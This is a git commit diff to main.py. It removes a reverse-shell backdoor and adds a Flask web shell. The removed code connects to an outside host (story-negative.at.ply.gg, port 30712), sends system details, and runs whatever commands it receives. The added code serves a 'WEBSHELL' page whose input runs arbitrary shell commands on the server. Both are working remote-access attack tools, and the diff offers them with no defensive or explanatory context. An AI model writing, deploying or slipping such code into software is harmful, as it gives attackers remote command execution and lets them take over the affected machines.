9ca1f24ff4cdff52b7e3d38c8ed6f8d3b17c5bb6
hacker31287 <87894845+hacker31287@users.noreply.github.com>
2023-01-07 07:54:59 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,51 +1,79 @@
-#!/usr/bin/python
-import socket,subprocess,time,os
-arch = os.popen("arch").read()
-if arch == '':
- arch = "x"
-info = os.popen("uname -a").read()
-if info == '':
- info = "x"
-ip = "story-negative.at.ply.gg"
-port = 30712
-while True:
-        print ("Try To Connect ...")
-        s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5.0)
-        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
-        if( x == 0):
-            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        try:
-            ipf = socket.gethostbyname(ip)
-            s.connect((ipf,port))
-        except socket.error:
-            time.sleep( 10)
-            continue
-        seg=('x'+'|'+'1.1.5'+'|'+'x'+'|'+str(arch)+'|'+str(info)+'|Lix8q').encode('utf-8')
-        s.send(seg)
-        print ("Done Connected !!!")
-        while 1:
-            try:
-                data1 = s.recv(1024)
-                data = data1.decode("utf-8")
-                if data.startswith('ZeXro0')==True:
-                    data = ('')
-                else:
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    u=(b'')
-                    while True:
-                      line = proc.stdout.readline()
-                      u+=line + (b"|")
-                      if line == (b''):  
-                          break
-                    s.send(bytes(u))
-                    s.send(b"BoXer")             
-            except socket.timeout:
-                time.sleep(0)
-                continue
-            except:
-                break
-        try:
-            s.close()
-        except:
-            pass
+#!/usr/bin/env python
+
+import subprocess
+from flask import Flask, render_template
+from flask_socketio import SocketIO, send, emit
+
+HTML = '''
+<html>
+    <head>
+        <title>WEBSHELL</title>
+        <script type="text/javascript" src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+        <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js"></script>
+        <script type="text/javascript" charset="utf-8">
+            var socket;
+            $(document).ready(function(){
+                socket = io.connect('http://' + document.domain + ':' + location.port + '/shell');
+                socket.on('connect', function() {
+                    socket.emit('joined', {});
+                });
+                socket.on('message', function(data) {
+                    $('#shell').val($('#shell').val() + data.msg + '\n');
+                    $('#shell').scrollTop($('#shell')[0].scrollHeight);
+                });
+                socket.on('status', function(data) {
+                    $('#shell').val($('#shell').val() + '<' + data.msg + '>\n');
+                    $('#shell').scrollTop($('#shell')[0].scrollHeight);
+                });
+                $('#text').keypress(function(e) {
+                    var code = e.keyCode || e.which;
+                    if (code == 13) {
+                        text = $('#text').val();
+                        $('#text').val('');
+                        socket.emit('comando', {msg: text});
+                    }
+                });
+            });
+            function leave_room() {
+                socket.disconnect();
+                window.location.href = "http://www.google.com";
+            }
+        </script>
+    </head>
+    <body>
+        <h1>WEBSHELL</h1>
+        <textarea id="shell" cols="80" rows="20"></textarea><br><br>
+        <input id="text" size="80" placeholder="Digite o comando"><br><br>
+        <a href="#" onclick="leave_room();">Sair</a>
+    </body>
+</html>
+'''
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'top secret'
+app.config['DEBUG'] = True
+socketio = SocketIO(app)
+
+@app.route('/')
+def index():
+    return render_template('shell.html')
+
+@socketio.on('joined', namespace='/shell')
+def joined(message):
+    emit('status', {'msg': 'CONECTADO COM SUCESSO'})
+    
+@socketio.on('comando', namespace='/shell')
+def comando(comando):
+    c = comando['msg']
+    emit('message', {'msg': '$ ' + c})
+    print(c)
+    try:
+        b = subprocess.check_output(c, shell=True).decode()
+    except Exception as err:
+        b = str(err)
+        
+    emit('message', {'msg': b})
+    
+if __name__ == '__main__':
+    socketio.run(app)
+    
